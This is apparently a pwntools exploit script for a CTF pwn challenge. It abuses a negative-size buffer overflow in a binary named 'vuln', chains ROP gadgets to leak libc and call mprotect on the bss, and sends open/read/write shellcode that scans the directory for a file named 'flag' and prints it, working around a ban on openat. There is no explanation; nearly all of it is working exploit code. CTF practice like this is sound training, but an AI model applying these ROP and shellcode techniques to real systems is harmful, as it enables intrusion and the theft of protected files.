# -*- coding: UTF-8 -*-
from fcntl import FASYNC
from elftools.construct.macros import Flag
from pwn import *
from pwnlib import flag

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
local = True
debug = True
if local:
    io = process('vuln')
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('./libc-2.31.so')
else:
    io = remote('chuj.top', 44237) #nc chuj.top 44237
    libc = ELF('./libc-2.31.so')
elf = ELF('vuln')
context(arch='amd64',os='linux')
l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))
def add(idx,size):
	sl('1')
	sla('Index?\n',str(idx))
	sla('Size?\n',str(size))
def show(idx):
	sl('2')
	sla('Index?\n',str(idx))
	
def edit(idx,content):
	sl('3')
	sla('Index?\n',str(idx))
	sa('content:\n',content)
		
def delete(idx):
	sl('4')
	sla('Index?\n',str(idx))

# 0x0000000000401443 : pop rdi ; ret
# 0x0000000000401441 : pop rsi ; pop r15 ; ret
# 404020 puts.plt
# 0x401311 main
shellcode1 = '''mov rax,0x67616c662f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall
mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
mov rdi,0
mov rax,60
syscall

'''
pop_rdi = 0x0000000000401443
pop_rsi_r15 = 0x0000000000401441
if False :
    # local rop of libc
    pop_rsi = 0x00000000000274f9  
    pop_rdx_r12 = 0x000000000011c341 
    #0x00000000000ab83b : mov qword ptr [rdi], rax ; mov rax, r9 ; ret
    move_rdi_rax = 0x00000000000ab83b
    #0x0000000000162938 : mov rdi, qword ptr [rdi] ; call qword ptr [rax + 0x1e8]
    move_rdi_call_rax = 0x0000000000162938
    #0x0000000000027096 : mov rsi, qword ptr [rax] ; xor eax, eax ; call qword ptr [rdx + 0x1d0]
    move_rsi_call_rdx = 0x0000000000027096
    pop_rbx = 0x000000000331cf
    pop_rax = 0x000000000004a520 # local
else:
    # remote rop of libc  cmd:ROPgadget --binary ./libc-2.31.so  --depth 20 > 2.txt
    pop_rsi = 0x0000000000027529 # remote  0x0000000000027529 local 0x00000000000274f9 
    pop_rdx_r12 = 0x000000000011c371 # remote  0x000000000011c371 local 0x000000000011c341
    #0x00000000000ab85b : mov qword ptr [rdi], rax ; mov rax, r9 ; ret
    move_rdi_rax = 0x00000000000ab85b
    #0x0000000000162858 : mov rdi, qword ptr [rdi] ; call qword ptr [rax + 0x1e8]
    move_rdi_call_rax = 0x0000000000162858
    #0x00000000000270c6 : mov rsi, qword ptr [rax] ; xor eax, eax ; call qword ptr [rdx + 0x1d0]
    move_rsi_call_rdx = 0x00000000000270c6
    pop_rbx = 0x00000000000331ff
    pop_rax = 0x000000000004a550 # local
 

bss = 0x404060
if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)
sla("size?\n",str(-1111111))
pay = 0x28*'a'+'a'*0x10+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(bss)+p64(0)+p64(elf.plt['write'])+p64(0x401311)
sa('content?\n',pay)
libcbase = l64()-libc.sym['_IO_2_1_stdout_']
lg('libcbase')
# gadget = libcbase + 0x154a10 # local  
setcontext = libcbase + libc.sym['setcontext'] + 61 
lg('setcontext')
mprotect_addr = libcbase + libc.sym['mprotect']#+ 0x11bad0 #
readdir = libcbase + libc.sym['readdir']
lg('readdir')
fdopendir = libcbase + libc.sym['fdopendir']
lg('fdopendir')

rdx = 4 | 2 | 1
if debug == True:
    dbg()
    raw_input()
sla("size?\n",str(-1111111))
pay = 0x28*'a'+'a'*0x8 + p64(bss+0x700+0x53) 
pay += p64(pop_rdi)+p64(bss-0x60) 
pay += p64(pop_rsi+libcbase)+p64(0x20000) 
pay += p64(pop_rdx_r12+libcbase)+p64(rdx)+p64(0) 
pay += p64(mprotect_addr) 
pay += p64(pop_rdi)+p64(0) 
pay += p64(pop_rsi+libcbase)+p64(bss+0x700) 
pay += p64(pop_rdx_r12+libcbase)+p64(0x300)+p64(0) 
pay += p64(elf.plt['read']) 

pay += p64(bss+0x700)
pay += p64(bss+0x700)

sa('content?\n',pay)

# ban openat,so funtion open of libc can't use
libc_read = libcbase + libc.sym['read'] 
libc_write = libcbase + libc.sym['write'] 
# shellcodeorw = asm()
shellcode = asm('''
/*open('./')*/
mov rax,0x2f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
/*fdopendir*/
mov rdi,rax
mov rax,%d
call rax
/*readdir*/
mov rdi,rax
mov rax,%d
call rax
/*search flag*/
mov rdi,0x1
loop:
inc rdi
cmp dword ptr[rax+rdi],0x67616c66
jnz loop

/*open('flagxxxxxxxxxxxxxxxxxxxxxxx')*/
lea rdi,[rax+rdi]
mov rsi,0
mov rdx,0
mov rax,2
syscall

/*read()*/
mov rdi,rax
mov rsi,rsp
mov rdx,1024
mov rax,0
syscall
/*write()*/
mov rdi,1
mov rsi,rsp
mov rdx,rax
mov rax,1
syscall
/*exit*/
mov rdi,0
mov rax,60
syscall

''' % (fdopendir,readdir))

ru('done!\n')
sl(shellcode) 
irt()
